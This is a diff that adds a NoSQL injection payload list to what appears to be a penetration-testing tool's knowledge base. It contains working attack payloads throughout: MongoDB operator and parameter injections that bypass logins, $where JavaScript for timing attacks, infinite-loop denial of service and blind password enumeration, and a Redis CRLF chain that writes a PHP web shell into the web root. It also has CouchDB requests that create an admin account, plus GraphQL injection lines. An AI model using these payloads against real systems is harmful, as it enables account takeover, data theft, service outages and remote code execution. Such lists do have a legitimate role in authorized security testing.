@@ -1,0 +1,68 @@
+# NoSQL Injection Payloads
+# WardenStrike Knowledge Base (MongoDB, Redis, CouchDB, Cassandra)
+
+# ─── MongoDB JSON injection ──────────────────────────────────────
+{"username": {"$ne": null}, "password": {"$ne": null}}
+{"username": {"$gt": ""}, "password": {"$gt": ""}}
+{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
+{"username": {"$in": ["admin","administrator","root"]}, "password": {"$ne": ""}}
+{"$where": "this.username == 'admin'"}
+{"username": "admin", "password": {"$gt": ""}}
+
+# ─── MongoDB URL/parameter injection ──────────────────────────────
+username[$ne]=invalid&password[$ne]=invalid
+username[$gt]=&password[$gt]=
+username[$regex]=.*&password[$regex]=.*
+username[$in][]=admin&password[$gt]=
+login[$ne]=xxx
+username=admin&password[$ne]=xxx
+
+# ─── MongoDB operator injection ──────────────────────────────────
+{"$where":"sleep(5000)"}
+{"username": {"$where": "sleep(5000)"}}
+{"$where": "function(){var d=new Date();var b=new Date();while(b-d<5000);return true;}"}
+{"username":{"$gt":""},"password":{"$gt":""}}
+{"username":{"$nin":["xxx"]},"password":{"$nin":["xxx"]}}
+
+# ─── BSON injection (login bypass) ──────────────────────────────
+username=admin' --
+username=admin'%20--
+username[$ne]=test&password[$ne]=test
+username=admin&password[$ne]=test
+admin'||'1'=='1
+admin' || 1==1//
+admin' || 1==1%00
+
+# ─── MongoDB $where JS injection (RCE on old versions) ───────────
+{"$where":"function(){return(this.username=='admin')}"}
+{"$where":"function(){while(1){}}"}  // DoS
+{"$where":"return true"}
+{"username":{"$where":"this.username=='admin'&&this.password.match(/^a/)"}}  // blind enum
+
+# ─── Blind NoSQLi (character enumeration) ────────────────────────
+username=admin&password[$regex]=^a
+username=admin&password[$regex]=^pa
+username=admin&password[$regex]=^pas
+# Continue until full password
+
+# ─── Redis injection ──────────────────────────────────────────────
+\r\nSET mykey myvalue\r\n
+\r\nCONFIG SET dir /var/www/html\r\n
+\r\nCONFIG SET dbfilename shell.php\r\n
+\r\nSET x "<?php system($_GET['cmd']); ?>"\r\n
+\r\nBGSAVE\r\n
+
+# ─── CouchDB ──────────────────────────────────────────────────────
+# Admin party (no auth) check:
+GET /_all_dbs HTTP/1.1
+GET /_users/_all_docs HTTP/1.1
+PUT /_config/admins/hacker {"value": "password"} HTTP/1.1
+
+# ─── GraphQL NoSQLi ──────────────────────────────────────────────
+{ user(id: {$ne: null}) { id name email } }
+{ users(filter: {password: {$regex: ".*"}}) { id email } }
+
+# ─── PHP type juggling with NoSQL ────────────────────────────────
+{"username":"admin","password":{"$gt":0}}
+{"username":"admin","password":{"$exists":true}}
+password[]=  (empty array)
